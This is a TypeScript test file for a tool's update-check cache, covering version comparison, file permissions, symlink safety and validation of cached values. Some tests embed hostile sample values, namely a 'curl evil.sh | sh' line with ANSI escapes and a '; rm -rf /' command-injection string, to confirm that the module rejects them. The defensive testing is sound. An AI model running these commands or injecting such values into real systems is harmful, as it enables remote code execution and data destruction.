import { afterEach, beforeEach, describe, it, expect } from "vitest";
import {
  existsSync,
  lstatSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  rmSync,
  statSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { isNewer, readCache, writeCache } from "../src/update-check.js";

describe("isNewer", () => {
  it("reports newer patch version", () => {
    expect(isNewer("0.2.1", "0.2.0")).toBe(true);
  });

  it("reports newer minor version", () => {
    expect(isNewer("0.3.0", "0.2.9")).toBe(true);
  });

  it("reports newer major version", () => {
    expect(isNewer("1.0.0", "0.99.99")).toBe(true);
  });

  it("returns false for equal versions", () => {
    expect(isNewer("0.2.1", "0.2.1")).toBe(false);
  });

  it("returns false when latest is older", () => {
    expect(isNewer("0.1.9", "0.2.0")).toBe(false);
  });

  it("ignores pre-release suffixes on the numeric triple", () => {
    expect(isNewer("0.3.0-beta.1", "0.2.0")).toBe(true);
  });

  it("returns false on malformed versions", () => {
    expect(isNewer("not-a-version", "0.2.0")).toBe(false);
    expect(isNewer("0.2.0", "garbage")).toBe(false);
  });
});

describe("writeCache (U1, U4 — atomic write + chmod)", () => {
  let tmp: string;
  let cacheDir: string;
  let cacheFile: string;

  beforeEach(() => {
    tmp = mkdtempSync(join(tmpdir(), "skillcam-cache-"));
    cacheDir = join(tmp, "cache");
    cacheFile = join(cacheDir, "update-check.json");
  });

  afterEach(() => {
    rmSync(tmp, { recursive: true, force: true });
  });

  it("writes a fresh cache file with 0o600 perms", () => {
    writeCache({ latest: "1.2.3", checkedAt: 1700000000000 }, cacheFile, cacheDir);
    expect(existsSync(cacheFile)).toBe(true);
    const data = JSON.parse(readFileSync(cacheFile, "utf-8"));
    expect(data.latest).toBe("1.2.3");
    expect(data.checkedAt).toBe(1700000000000);
    // mode: lower 9 bits should be 0o600 on POSIX. Skip check on Windows.
    if (process.platform !== "win32") {
      const mode = statSync(cacheFile).mode & 0o777;
      expect(mode).toBe(0o600);
    }
  });

  it("U4 — enforces 0o700 on the cache dir even if it pre-existed laxer", () => {
    if (process.platform === "win32") return;
    mkdirSync(cacheDir, { recursive: true, mode: 0o777 });
    writeCache({ latest: "1.2.3", checkedAt: 1 }, cacheFile, cacheDir);
    const mode = statSync(cacheDir).mode & 0o777;
    expect(mode).toBe(0o700);
  });

  it("U1 — replaces a symlink at cache path without writing through it", () => {
    if (process.platform === "win32") return;
    mkdirSync(cacheDir, { recursive: true });
    // Plant the attack: cache file is a symlink to a target outside the dir.
    const target = join(tmp, "ATTACKER_TARGET");
    writeFileSync(target, "DO NOT OVERWRITE\n");
    symlinkSync(target, cacheFile);
    expect(lstatSync(cacheFile).isSymbolicLink()).toBe(true);

    writeCache({ latest: "9.9.9", checkedAt: 42 }, cacheFile, cacheDir);

    // Cache file should now be a regular file with our payload.
    expect(lstatSync(cacheFile).isSymbolicLink()).toBe(false);
    expect(JSON.parse(readFileSync(cacheFile, "utf-8")).latest).toBe("9.9.9");
    // The symlink target must be untouched.
    expect(readFileSync(target, "utf-8")).toBe("DO NOT OVERWRITE\n");
  });

  it("U1 — leaves no .tmp leftover after a successful write", () => {
    writeCache({ latest: "1.2.3", checkedAt: 1 }, cacheFile, cacheDir);
    const leftovers = readdirSync(cacheDir).filter((f) => f.endsWith(".tmp"));
    expect(leftovers).toEqual([]);
  });
});

describe("readCache", () => {
  let tmp: string;
  let cacheFile: string;

  beforeEach(() => {
    tmp = mkdtempSync(join(tmpdir(), "skillcam-read-"));
    cacheFile = join(tmp, "update-check.json");
  });

  afterEach(() => {
    rmSync(tmp, { recursive: true, force: true });
  });

  it("returns null when file does not exist", () => {
    expect(readCache(cacheFile)).toBe(null);
  });

  it("returns null on malformed JSON", () => {
    writeFileSync(cacheFile, "{not json");
    expect(readCache(cacheFile)).toBe(null);
  });

  it("returns parsed entry on a valid cache file", () => {
    writeFileSync(
      cacheFile,
      JSON.stringify({ latest: "0.2.3", checkedAt: Date.now() - 1000 })
    );
    const out = readCache(cacheFile);
    expect(out?.latest).toBe("0.2.3");
  });

  it("U2 — rejects a poisoned `latest` with newline + ANSI", () => {
    writeFileSync(
      cacheFile,
      JSON.stringify({
        latest: "9.9.9\n  Run: curl evil.sh | sh  # \u001b[31m",
        checkedAt: Date.now() - 1000,
      })
    );
    expect(readCache(cacheFile)).toBe(null);
  });

  it("U2 — rejects a `latest` containing shell metacharacters", () => {
    writeFileSync(
      cacheFile,
      JSON.stringify({
        latest: "9.9.9; rm -rf /",
        checkedAt: Date.now() - 1000,
      })
    );
    expect(readCache(cacheFile)).toBe(null);
  });

  it("U2 — accepts standard semver with prerelease + build", () => {
    writeFileSync(
      cacheFile,
      JSON.stringify({ latest: "1.2.3-beta.1+build.42", checkedAt: Date.now() - 1000 })
    );
    expect(readCache(cacheFile)?.latest).toBe("1.2.3-beta.1+build.42");
  });

  it("U3 — rejects checkedAt: Infinity (would freeze the cache)", () => {
    writeFileSync(
      cacheFile,
      JSON.stringify({ latest: "0.2.3", checkedAt: Number.POSITIVE_INFINITY })
    );
    // JSON.stringify turns Infinity into null — but if a planted file
    // bypassed JSON, the in-memory check still rejects. Test both.
    expect(readCache(cacheFile)).toBe(null);

    writeFileSync(cacheFile, '{"latest":"0.2.3","checkedAt":1e9999}');
    expect(readCache(cacheFile)).toBe(null);
  });

  it("U3 — rejects checkedAt: NaN", () => {
    writeFileSync(cacheFile, '{"latest":"0.2.3","checkedAt":NaN}');
    expect(readCache(cacheFile)).toBe(null);
  });

  it("U3 — rejects checkedAt in the far future", () => {
    writeFileSync(
      cacheFile,
      JSON.stringify({
        latest: "0.2.3",
        checkedAt: Date.now() + 10 * 365 * 24 * 3600 * 1000,
      })
    );
    expect(readCache(cacheFile)).toBe(null);
  });

  it("U3 — rejects checkedAt: 0 or negative", () => {
    writeFileSync(cacheFile, JSON.stringify({ latest: "0.2.3", checkedAt: 0 }));
    expect(readCache(cacheFile)).toBe(null);
    writeFileSync(cacheFile, JSON.stringify({ latest: "0.2.3", checkedAt: -1 }));
    expect(readCache(cacheFile)).toBe(null);
  });
});
